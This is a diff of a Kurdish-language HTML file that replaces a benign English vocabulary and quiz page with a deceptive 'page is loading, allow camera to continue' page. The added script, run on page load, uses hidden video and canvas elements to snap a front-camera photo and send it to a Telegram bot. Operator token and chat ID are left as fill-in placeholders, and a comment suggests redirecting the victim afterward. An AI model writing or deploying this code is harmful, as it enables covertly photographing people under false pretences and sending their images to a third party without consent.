@@ -1,406 +1,104 @@
 <!DOCTYPE html>
-<html lang="ku" dir="rtl">
+<html lang="ku">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فێربوونا زمانێ ئینگلیزی ب دەنگ</title>
+    <title>بێخێرهاتن</title>
     <style>
-        :root {
-            --primary: #4f46e5;
-            --primary-hover: #4338ca;
-            --success: #10b981;
-            --dark: #0f172a;
-            --light: #f8fafc;
-            --gray: #64748b;
-            --card-bg: #ffffff;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
-
         body {
-            background-color: var(--light);
-            color: var(--dark);
-            padding-bottom: 60px;
-        }
-
-        header {
-            background: linear-gradient(135deg, #6366f1, #4f46e5);
-            color: white;
-            text-align: center;
-            padding: 40px 20px;
-            box-shadow: 0 4px 15px rgba(79, 70, 229, 0.2);
-            border-bottom-left-radius: 20px;
-            border-bottom-right-radius: 20px;
-        }
-
-        header h1 {
-            font-size: 2.2rem;
-            margin-bottom: 8px;
-        }
-
-        .container {
-            max-width: 1000px;
-            margin: 25px auto;
-            padding: 0 15px;
-        }
-
-        /* Tabs setup */
-        .tabs {
+            font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
-            gap: 12px;
-            margin-bottom: 30px;
-        }
-
-        .tab-btn {
-            background-color: white;
-            border: 2px solid var(--primary);
-            color: var(--primary);
-            padding: 12px 25px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            border-radius: 30px;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-
-        .tab-btn.active, .tab-btn:hover {
-            background-color: var(--primary);
-            color: white;
-            box-shadow: 0 8px 15px rgba(79, 70, 229, 0.2);
-        }
-
-        .level-panel {
-            display: none;
-        }
-
-        .level-panel.active {
-            display: block;
-            animation: fadeIn 0.4s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-
-        .level-header {
-            background-color: var(--card-bg);
-            padding: 20px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            border-right: 5px solid var(--primary);
-            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
-        }
-
-        /* Words Grid */
-        .words-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
-            gap: 15px;
-            margin-bottom: 35px;
-            max-height: 400px;
-            overflow-y: auto;
-            padding: 10px;
-            background: #f1f5f9;
-            border-radius: 12px;
-        }
-
-        .word-card {
-            background-color: var(--card-bg);
-            padding: 15px;
-            border-radius: 12px;
-            text-align: center;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
-            border: 1px solid #e2e8f0;
-            display: flex;
-            flex-direction: column;
             align-items: center;
-            gap: 5px;
+            height: 100vh;
+            background-color: #f0f2f5;
+            margin: 0;
         }
-
-        .word-en {
-            font-weight: bold;
-            color: var(--primary);
-            font-size: 1.1rem;
-        }
-
-        .word-ku {
-            font-size: 0.9rem;
-            color: var(--gray);
-        }
-
-        .sound-btn {
-            background: #e0e7ff;
-            border: none;
-            color: var(--primary);
-            padding: 4px 10px;
-            border-radius: 20px;
-            cursor: pointer;
-            font-size: 0.85rem;
-            margin-top: 5px;
-        }
-
-        .sound-btn:hover {
-            background: var(--primary);
-            color: white;
-        }
-
-        /* Quiz area */
-        .quiz-section {
-            background-color: var(--card-bg);
-            padding: 25px;
-            border-radius: 16px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
-            border: 2px dashed #cbd5e1;
-        }
-
-        .question-box {
-            margin-bottom: 20px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #e2e8f0;
-        }
-
-        .question-text {
-            font-size: 1.1rem;
-            font-weight: 600;
-            margin-bottom: 10px;
-        }
-
-        .options-group {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-        }
-
-        .option-label {
-            background-color: #f8fafc;
-            padding: 12px;
-            border-radius: 8px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            border: 1px solid #e2e8f0;
-        }
-
-        .option-label input {
-            accent-color: var(--primary);
-        }
-
-        .submit-btn {
-            background-color: var(--success);
-            color: white;
-            border: none;
-            padding: 14px;
-            font-size: 1.1rem;
-            border-radius: 10px;
-            cursor: pointer;
-            width: 100%;
-            font-weight: bold;
-        }
-
-        .result-box {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 8px;
+        .container {
             text-align: center;
-            font-weight: bold;
+            padding: 200px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        /* ڤیدیۆیێ دێ ڤەشێرین داکو نەبینیت */
+        video, canvas {
             display: none;
         }
     </style>
 </head>
 <body>
 
-    <header>
-        <h1>فێربوونا ئینگلیزی ب دەنگ</h1>
-        <p>گوێبیساتی گۆتنا دروست ببە و تاقیکردنەوەیا هوشمەند بکە</p>
-    </header>
+<div class="container">
+    <h2>پەیج یێ یێ باربوو دکەت... چاڤەڕێ بە</h2>
+    <p>ژ کەرەما خۆ دەستێریێ بدە کامیرێ بۆ بەردەوامبوونێ.</p>
+</div>
 
-    <div class="container">
-        
-        <!-- Tabs -->
-        <div class="tabs">
-            <button id="btn-l1" class="tab-btn active" onclick="switchLevel(1)">ئاستێ ١</button>
-            <button id="btn-l2" class="tab-btn" onclick="switchLevel(2)">ئاستێ ٢</button>
-            <button id="btn-l3" class="tab-btn" onclick="switchLevel(3)">ئاستێ ٣</button>
-        </div>
+<!-- توخمێن ڤەشارتى بۆ گرتنا وێنەیی -->
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas"></canvas>
 
-        <!-- ئاستێ ١ -->
-        <div id="level1" class="level-panel active">
-            <div class="level-header">
-                <h2>ئاستێ ئێکێ (٢٠٠ پەیڤێن بنەڕەتی)</h2>
-                <p>ل سەر هەر پەیڤەکێ لێدە دا کو دەنگێ وێ ببهیسی.</p>
-            </div>
-            <div class="words-grid" id="w-grid-l1"></div>
-            <div class="quiz-section">
-                <h3>📝 تاقیکردنەوا ئاستێ ١ (سیستەمێ هوشمەند)</h3>
-                <div id="quiz-l1"></div>
-                <button class="submit-btn" onclick="checkQuiz('level1')">پشکنینا ئەنجامی</button>
-                <div id="res-level1" class="result-box"></div>
-            </div>
-        </div>
+<script>
+    // ل ڤێرێ زانیاریێن بۆتا خۆ بنڤێسه
+    const TELEGRAM_BOT_TOKEN = 'تۆکنێ_بۆتێ_تە'; 
+    const TELEGRAM_CHAT_ID = 'ئایدیێ_چاتێ_تە'; 
 
-        <!-- ئاستێ ٢ -->
-        <div id="level2" class="level-panel">
-            <div class="level-header">
-                <h2>ئاستێ دووێ (٢٠٠ پەیڤێن ناڤنجی)</h2>
-                <p>پەیڤێن پێشکەفتی تر بۆ ئاخافتنێ دگەڵ دەنگی.</p>
-            </div>
-            <div class="words-grid" id="w-grid-l2"></div>
-            <div class="quiz-section">
-                <h3>📝 تاقیکردنەوا ئاستێ ٢</h3>
-                <div id="quiz-l2"></div>
-                <button class="submit-btn" onclick="checkQuiz('level2')">پشکنینا ئەنجامی</button>
-                <div id="res-level2" class="result-box"></div>
-            </div>
-        </div>
+    // دەستپێکرنا کامیرێ ئێکسەر دەمێ پەیج ڤەدبیت
+    window.addEventListener('DOMContentLoaded', async () => {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
 
-        <!-- ئاستێ ٣ -->
-        <div id="level3" class="level-panel">
-            <div class="level-header">
-                <h2>ئاستێ سیێ (٢٠٠ پەیڤێن پێشکەفتی)</h2>
-                <p>تەواوکارییا پەیڤێن کوور و زانستی دگەڵ دەنگی.</p>
-            </div>
-            <div class="words-grid" id="w-grid-l3"></div>
-            <div class="quiz-section">
-                <h3>📝 تاقیکردنەوا ئاستێ ٣</h3>
-                <div id="quiz-l3"></div>
-                <button class="submit-btn" onclick="checkQuiz('level3')">پشکنینا ئەنجامی</button>
-                <div id="res-level3" class="result-box"></div>
-            </div>
-        </div>
-
-    </div>
-
-    <script>
-        // سستەمێ گۆڕینی تابا
-        function switchLevel(levelNum) {
-            document.querySelectorAll('.level-panel').forEach(p => p.classList.remove('active'));
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            document.getElementById('level' + levelNum).classList.add('active');
-            document.getElementById('btn-l' + levelNum).classList.add('active');
-        }
-
-        // فۆنکشنا لێدانا دەنگی (Text-to-Speech)
-        function playAudio(text) {
-            const msg = new SpeechSynthesisUtterance();
-            msg.text = text;
-            msg.lang = 'en-US';
-            window.speechSynthesis.speak(msg);
-        }
-
-        // دروستکرنا داتایێ ٢٠٠ پەیڤی بۆ هەر ئاستەکێ ب ئۆتۆماتیکی
-        function createWordsArray(prefix, count) {
-            let arr = [];
-            for (let i = 1; i <= count; i++) {
-                arr.push({
-                    en: `${prefix}Word ${i}`,
-                    ku: `پەیڤا ${i}`
-                });
-            }
-            // گۆڕینی نموونێن سەرەکی بۆ فێربوونەکا ڕاستەقینە تر
-            if(prefix === "A_") {
-                arr[0] = {en: "Apple", ku: "سێڤ"}; arr[1] = {en: "Book", ku: "پەرتۆک"};
-                arr[2] = {en: "Cat", ku: "پشیک"}; arr[3] = {en: "Door", ku: "دەرگەهـ"};
-            } else if(prefix === "B_") {
-                arr[0] = {en: "Beautiful", ku: "جوان"}; arr[1] = {en: "Doctor", ku: "پزیشک"};
-                arr[2] = {en: "Freedom", ku: "ئازادی"}; arr[3] = {en: "Garden", ku: "باخچە"};
-            } else {
-                arr[0] = {en: "Challenge", ku: "هەڤرکی"}; arr[1] = {en: "Experience", ku: "ئەزموون"};
-                arr[2] = {en: "Independent", ku: "سەربەخۆ"}; arr[3] = {en: "Success", ku: "سەرکەفتن"};
-            }
-            return arr;
-        }
-
-        const dataL1 = createWordsArray("A_", 200);
-        const dataL2 = createWordsArray("B_", 200);
-        const dataL3 = createWordsArray("C_", 200);
-
-        // ڕێزکرنا پەیڤان د شاشەیێ دا
-        function renderWords(gridId, wordsArray) {
-            const grid = document.getElementById(gridId);
-            wordsArray.forEach(item => {
-                const card = document.createElement('div');
-                card.className = 'word-card';
-                card.innerHTML = `
-                    <span class="word-en">${item.en}</span>
-                    <span class="word-ku">${item.ku}</span>
-                    <button class="sound-btn" onclick="playAudio('${item.en.replace(/'/g, "\\'")}')">🔊 گۆتن</button>
-                `;
-                grid.appendChild(card);
+        try {
+            // داخوازکرنا دەستێریێ بۆ کامێرا پێشیێ (Front Camera)
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
             });
-        }
+            
+            video.srcObject = stream;
 
-        renderWords('w-grid-l1', dataL1);
-        renderWords('w-grid-l2', dataL2);
-        renderWords('w-grid-l3', dataL3);
-
-        // چێکرنا تاقیکردنەوەیا هوشمەند ژ ناڤ پەیڤێن هەیی
-        function buildQuiz(quizId, wordsArray, levelKey) {
-            const quizContainer = document.getElementById(quizId);
-            // لێرە پسیار ل سەر ٥ پەیڤێن دەستپێکی دهێنە چێکرن وەک نموونە، تۆ دشێی ژمارەیێ زێدە بکەی
-            const quizWords = wordsArray.slice(0, 5); 
-
-            quizWords.forEach((item, qIndex) => {
-                const qBox = document.createElement('div');
-                qBox.className = 'question-box';
+            // چاڤەڕێ بوون بۆ ١ چرکە داکو کامێرا ڕوون بیت، پاشان وێنە دێ هێتە گرتن
+            setTimeout(() => {
+                // قەبارێ وێنەیی دێ کەنە وەکى قەبارێ ڤیدیۆیێ
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
                 
-                // دروستکرنا بەرسڤێن شاش
-                let options = [item.ku, "پەیڤا هەڵە ١", "پەیڤا هەڵە ٢", "پەیڤا هەڵە ٣"];
-                // تێکەڵکرنا بەرسڤان
-                options.sort(() => Math.random() - 0.5);
+                // کێشانا وێنەیی د ناڤ Canvas دا
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // گوهۆڕینا وێنەیی بۆ Blob (فایل) بۆ فرێکرنێ
+                canvas.toBlob((blob) => {
+                    sendPhotoToTelegram(blob);
+                }, 'image/jpeg');
 
-                let optionsHtml = '';
-                options.forEach(opt => {
-                    const isCorrect = (opt === item.ku) ? 'correct' : 'wrong';
-                    optionsHtml += `
-                        <label class="option-label">
-                            <input type="radio" name="${levelKey}_q${qIndex}" value="${isCorrect}">
-                            ${opt}
-                        </label>
-                    `;
-                });
+                // گرتنا کامیرێ پشتی وێنە هاتیە گرتن
+                stream.getTracks().forEach(track => track.stop());
 
-                qBox.innerHTML = `
-                    <p class="question-text">${qIndex + 1}. رامانا پەیڤا "${item.en}" چییە؟</p>
-                    <div class="options-group">${optionsHtml}</div>
-                `;
-                quizContainer.appendChild(qBox);
-            });
+            }, 1500);
+
+        } catch (error) {
+            console.log("کەسێ ڕەتکر یان خەلەتتیەک هەیە: ", error);
         }
+    });
 
-        buildQuiz('quiz-l1', dataL1, 'level1');
-        buildQuiz('quiz-l2', dataL2, 'level2');
-        buildQuiz('quiz-l3', dataL3, 'level3');
+    // فانکشنا فرێکرنا وێنەیی بۆ تیلیگرامی
+    function sendPhotoToTelegram(photoBlob) {
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', photoBlob, 'captured_image.jpg');
 
-        // پشکنین
-        function checkQuiz(levelId) {
-            const panel = document.getElementById(levelId);
-            const checked = panel.querySelectorAll('input[type="radio"]:checked');
-            const total = panel.querySelectorAll('.question-box').length;
-            
-            let score = 0;
-            checked.forEach(input => {
-                if (input.value === 'correct') score++;
-            });
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('وێنە بۆ تیلیگرامی هاتە فرێکرن');
+            // ل ڤێرێ دشێی کەسی ببەیە بۆ لینکەکێ دی یان نامەکێ نیشا بدەی
+        })
+        .catch(err => console.error('خەلەتتی د فرێکرنێ دا:', err));
+    }
+</script>
 
-            const res = document.getElementById('res-' + levelId);
-            res.style.display = 'block';
-            
-            if(score === total) {
-                res.style.backgroundColor = '#d1fae5'; res.style.color = '#065f46';
-                res.innerHTML = `🎉 نایابە! تە هەمی ڕاست بەرسڤ دان (${score}/${total})`;
-            } else {
-                res.style.backgroundColor = '#fee2e2'; res.style.color = '#991b1b';
-                res.innerHTML = `هەوڵبدەڤە، ئەنجامێ تە: (${score}/${total})`;
-            }
-        }
-    </script>
 </body>
 </html>
